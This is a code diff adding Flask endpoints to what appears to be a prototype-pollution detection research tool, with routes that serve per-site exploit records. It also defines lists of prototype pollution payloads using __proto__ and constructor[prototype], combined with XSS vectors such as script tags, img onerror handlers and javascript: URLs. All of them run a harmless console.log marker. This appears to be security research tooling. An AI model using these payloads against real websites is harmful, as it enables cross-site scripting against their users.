@@ -51,6 +51,108 @@ def add_data_to_change():
     
     return Response('Data added', status=200)
 
+# Get data_to_change
+@phase3_api.route('/data_to_change', methods=['GET'])
+def get_data_to_change():
+    site = request.args.get('site')
+    if (site):
+        data_to_change_obj = db["phase3"]["data_to_change"].find_one({"_id": site})
+        if (data_to_change_obj):
+            # change dummy payload to "dummy"
+            # for data in data_to_change_obj["data_to_change"]:
+            #     if data["payload"] == "~":
+            #         data["payload"] = "dummy"
+            # only select non-dummy payload
+            data_to_change_obj["data_to_change"] = [x for x in data_to_change_obj["data_to_change"] if x["payload"] != "~"]
+            # only select keyname == ar
+            # data_to_change_obj["data_to_change"] = [x for x in data_to_change_obj["data_to_change"] if x["var_name"] == "ar"]
+            # only select the two elements
+            # if len(data_to_change_obj["data_to_change"]) > 2:
+            #     data_to_change_obj["data_to_change"] = data_to_change_obj["data_to_change"][:2]
+            # if there are two elements with the same 
+            return data_to_change_obj
+        else:
+            return Response('Site not found', status=404)
+    else:
+        return Response('Missing arg: site', status=400)
+
+# get data_to_change_failed_flow
+@phase3_api.route('/data_to_change_failed_flow', methods=['GET'])
+def get_data_to_change_failed_flow():
+    site = request.args.get('site')
+    if (site):
+        data_to_change_failed_flow_obj = db["phase3"]["data_to_change_failed_flow"].find_one({"_id": site})
+        if (data_to_change_failed_flow_obj):
+            return data_to_change_failed_flow_obj
+        else:
+            return Response('Site not found', status=404)
+    else:
+        return Response('Missing arg: site', status=400)
+
+# get data_to_change_dummy_value
+@phase3_api.route('/data_to_change_dummy_value', methods=['GET'])
+def get_data_to_change_dummy_value():
+    site = request.args.get('site')
+    if (site):
+        data_to_change_dummy_value_obj = db["phase3"]["data_to_change_dummy_value"].find_one({"_id": site})
+        if (data_to_change_dummy_value_obj):
+            return data_to_change_dummy_value_obj
+        else:
+            return Response('Site not found', status=404)
+    else:
+        return Response('Missing arg: site', status=400)
+
+html_exploit = [
+    "__proto__[98765]=<script>console.log(67890)</script>", 
+    "__proto__[98765]=<img/src/onerror%3dconsole.log(67890)>", 
+    "__proto__[98765]=<img src=1 onerror=console.log(67890)>", 
+    "__proto__[98765]=javascript:console.log(67890)//",
+    "constructor[prototype][98765]=<script>console.log(67890)</script>", 
+    "constructor[prototype][98765]=<img/src/onerror%3dconsole.log(67890)>", 
+    "constructor[prototype][98765]=<img src=1 onerror=console.log(67890)>", 
+    "constructor[prototype][98765]=javascript:console.log(67890)//"
+]
+javascript_exploit = [
+    "__proto__[98765]=console.log(67890)//",
+    "__proto__[98765]=a+console.log(67890)//", # `a` is the polluted value part that flows to the sink
+    "constructor[prototype][98765]=console.log(67890)//",  
+]
+setTaintAttribute_exploit = [
+    "__proto__[98765]=<script>console.log(67890)</script>", 
+    "__proto__[98765]=<img/src/onerror%3dconsole.log(67890)>", 
+    "__proto__[98765]=<img src=1 onerror=console.log(67890)>", 
+    "__proto__[98765]=javascript:console.log(67890)//",
+    "constructor[prototype][98765]=<script>console.log(67890)</script>", 
+    "constructor[prototype][98765]=<img/src/onerror%3dconsole.log(67890)>", 
+    "constructor[prototype][98765]=<img src=1 onerror=console.log(67890)>", 
+    "constructor[prototype][98765]=javascript:console.log(67890)//"
+]
+  
+# Generate exploit
+@phase3_api.route('/exploit', methods=['GET'])
+def gen_exploit():
+    site = request.args.get('site')
+    if (site):
+        exploit_obj = db["phase3"]["exploit"].find_one({"_id":  site})
+        if (exploit_obj):
+            return exploit_obj
+        else:
+            return Response('Site not found', status=404)
+    else:
+        return Response('Missing arg: site', status=400)   
+
+@phase3_api.route('/cookie_url_exploit', methods=['GET'])
+def get_cookie_url_exploit():
+    site = request.args.get('site')
+    if (site):
+        cookie_url_exploit_obj = db["phase3"]["cookie_url_exploit"].find_one({"_id": site})
+        if (cookie_url_exploit_obj):
+            return cookie_url_exploit_obj
+        else:
+            return Response('Site not found', status=404)
+    else:
+        return Response('Missing arg: site', status=400)
+
 # This works similar to the undefined_value in phase 1
 @phase3_api.route('/undefined_value', methods=['POST'])
 def add_undefined_value():
